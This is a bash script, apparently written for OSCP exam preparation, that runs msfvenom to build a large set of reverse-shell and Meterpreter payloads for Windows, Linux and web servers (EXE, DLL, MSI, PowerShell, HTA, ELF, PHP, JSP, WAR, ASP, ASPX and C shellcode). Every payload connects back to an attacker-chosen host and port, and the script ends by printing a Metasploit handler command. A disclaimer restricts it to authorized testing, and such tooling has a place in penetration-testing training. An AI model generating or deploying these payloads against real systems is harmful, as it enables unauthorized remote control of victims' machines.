#!/bin/bash
#==============================================================================
# Generate Common MSFVenom Payloads for OSCP
# Usage: ./generate_payloads.sh <LHOST> <LPORT> [output_dir]
# Author: Brad Turner
#
# DISCLAIMER: For authorized security testing only. Do not use against systems
# without explicit written permission. The author assumes no liability for
# misuse. You are responsible for compliance with all applicable laws.
#==============================================================================

LHOST=${1:?Usage: $0 <LHOST> <LPORT> [output_dir]}
LPORT=${2:?Usage: $0 <LHOST> <LPORT> [output_dir]}
OUTDIR=${3:-"./payloads"}

mkdir -p "$OUTDIR"

echo "[*] Generating payloads for $LHOST:$LPORT"
echo "[*] Output directory: $OUTDIR"
echo ""

#------------------------------------------------------------------------------
# WINDOWS PAYLOADS
#------------------------------------------------------------------------------
echo "[+] Windows Meterpreter (64-bit staged)..."
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f exe -o "$OUTDIR/shell64_staged.exe"

echo "[+] Windows Meterpreter (64-bit stageless)..."
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f exe -o "$OUTDIR/shell64_stageless.exe"

echo "[+] Windows Shell (64-bit staged - non-meterpreter)..."
msfvenom -p windows/x64/shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f exe -o "$OUTDIR/shell64_basic.exe"

echo "[+] Windows Meterpreter (32-bit staged)..."
msfvenom -p windows/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f exe -o "$OUTDIR/shell32_staged.exe"

echo "[+] Windows DLL (64-bit)..."
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f dll -o "$OUTDIR/shell64.dll"

echo "[+] Windows MSI (for AlwaysInstallElevated)..."
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f msi -o "$OUTDIR/shell.msi"

echo "[+] Windows Service EXE..."
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f exe-service -o "$OUTDIR/shell_service.exe"

echo "[+] Windows PowerShell one-liner..."
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f psh -o "$OUTDIR/shell.ps1"

echo "[+] Windows HTA..."
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f hta-psh -o "$OUTDIR/shell.hta"

#------------------------------------------------------------------------------
# LINUX PAYLOADS
#------------------------------------------------------------------------------
echo "[+] Linux Meterpreter (64-bit staged)..."
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f elf -o "$OUTDIR/shell64_staged"

echo "[+] Linux Meterpreter (64-bit stageless)..."
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f elf -o "$OUTDIR/shell64_stageless"

echo "[+] Linux Shell (64-bit - non-meterpreter)..."
msfvenom -p linux/x64/shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f elf -o "$OUTDIR/shell64_basic"

echo "[+] Linux Shell (32-bit)..."
msfvenom -p linux/x86/shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f elf -o "$OUTDIR/shell32_basic"

#------------------------------------------------------------------------------
# WEB PAYLOADS
#------------------------------------------------------------------------------
echo "[+] PHP reverse shell..."
msfvenom -p php/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f raw -o "$OUTDIR/shell.php"
# Add PHP tags
echo "<?php $(cat "$OUTDIR/shell.php") ?>" > "$OUTDIR/shell.php"

echo "[+] JSP reverse shell..."
msfvenom -p java/jsp_shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f raw -o "$OUTDIR/shell.jsp"

echo "[+] WAR file..."
msfvenom -p java/jsp_shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f war -o "$OUTDIR/shell.war"

echo "[+] ASP reverse shell..."
msfvenom -p windows/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f asp -o "$OUTDIR/shell.asp"

echo "[+] ASPX reverse shell..."
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f aspx -o "$OUTDIR/shell.aspx"

#------------------------------------------------------------------------------
# SHELLCODE
#------------------------------------------------------------------------------
echo "[+] Windows shellcode (C format)..."
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f c -o "$OUTDIR/shellcode_win64.c"

echo "[+] Linux shellcode (C format)..."
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f c -o "$OUTDIR/shellcode_linux64.c"

#------------------------------------------------------------------------------
# SUMMARY
#------------------------------------------------------------------------------
echo ""
echo "============================================"
echo "[*] Payloads generated in: $OUTDIR"
echo "============================================"
ls -la "$OUTDIR"
echo ""
echo "Handler command:"
echo "  msfconsole -x \"use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; exploit -j\""
echo ""
echo "Remember: chmod +x on Linux payloads before transfer!"

